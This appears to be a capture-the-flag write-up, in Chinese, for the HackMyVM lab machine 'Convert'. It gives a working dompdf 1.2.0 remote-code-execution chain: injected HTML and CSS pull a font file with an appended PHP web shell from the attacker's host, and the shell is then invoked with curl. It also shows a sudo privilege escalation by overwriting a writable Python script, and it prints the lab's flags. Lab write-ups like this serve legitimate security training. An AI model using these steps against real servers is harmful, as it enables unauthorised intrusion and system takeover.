# Convert

2024.12.28 https://hackmyvm.eu/machines/machine.php?vm=Convert

[video](https://www.bilibili.com/video/BV1PqQVY2Ega/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

22 端口上不允许匿名登陆，看看 80 web 上有什么信息：http://192.168.5.40/ 显示了一个网页转化为 pdf 的网站。

先对其进行目录扫描，看看有什么：

```
http://192.168.5.40/index.php            (Status: 200) [Size: 1026]
http://192.168.5.40/upload               (Status: 301) [Size: 169] [--> http://192.168.5.40/upload/]
```

http://192.168.5.40/upload 403 不允许访问。其中转化出来的 pdf 是存在这个目录中 http://192.168.5.40/upload/

重点来看这个 html to pdf 的功能，把自己转换出来的 pdf 保存在 kali 上，然后查看 pdf 详细信息：

```
pdfinfo 1111.pdf

Producer:        dompdf 1.2.0 + CPDF
CreationDate:    Sun Apr 28 11:03:52 2024 CST
ModDate:         Sun Apr 28 11:03:52 2024 CST
```

看到是 dompdf 1.2.0 转换生成的，经过搜索，这个 pdf 转换库，存在 RCE 漏洞 51270.py，进行利用：

```
python3 51270.py --inject http://192.168.5.40/index.php?url= --dompdf http://192.168.5.40/dompdf/

[err]: failed to trigger the payload!
[inf]: url: http://192.168.5.40/dompdf/lib/fonts/exploitfont_normal_f776a221d3d01869caf352500f07dfe4.php - status_code: 404
[inf]: process complete!
```

但是最后出现 php 后门访问不到的情况。

经过搜索，参照了这个利用: https://github.com/positive-security/dompdf-rce

创建 3 个文件：

index.html:

```
<link rel=stylesheet href='http://192.168.5.3:9001/exploit.css'>
```

exploit.css:

```
@font-face {
    font-family:'exploitfont';
    src:url('http://192.168.5.3:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
}
```

exploit_font.php:

```
find / -name "*.ttf" 2>/dev/null # 随意找到一个 ttf 文件，在其末尾写入 web shell
cp /usr/share/fonts/truetype/lato/Lato-Medium.ttf exploit_font.php

echo "<?php system('$_REQUEST[]');?>" >> exploit_font.php

echo -n http://192.168.5.3:9001/exploit_font.php |md5sum
f776a221d3d01869caf352500f07dfe4
```

然后对这个 url 进行 pdf 转换： http://192.168.5.3:9001/index.html ，然后在访问写入的后门链接：

```
curl --output - http://192.168.5.40/dompdf/lib/fonts/exploitfont_normal_f776a221d3d01869caf352500f07dfe4.php?1=id

uid=1000(eva) gid=1000(eva) groups=1000(eva)
```

直接先进行反弹,先拿到了 user flag：

```
eva@convert:~$ cat /home/eva/user.txt
f2be48d6f922bfc0a9bf45b22887c10d
```

sudo -l 显示 `(ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *` 看一下/home/eva/pdfgen.py 的源代码，实现的功能能将读取到的 url 内容保存到 pdf 中，但是程序中做了限制，不能用 file 和 data 的 schema，也不能访问 etc 和 root 开始的目录，找不到直接漏洞。

这个文件在/home/eva 目录中，当前用户有写权限，直接将这个文件删除，然后重建：

```
rm -f pdfgen.py
echo 'import os;os.system("/bin/bash -p")' > pdfgen.py

sudo /usr/bin/python3 /home/eva/pdfgen.py 1
```

拿到了最终的 flag：

```
root@convert:~# cat root.txt
1cc872dad04d177e6732abbedf1e525b
```
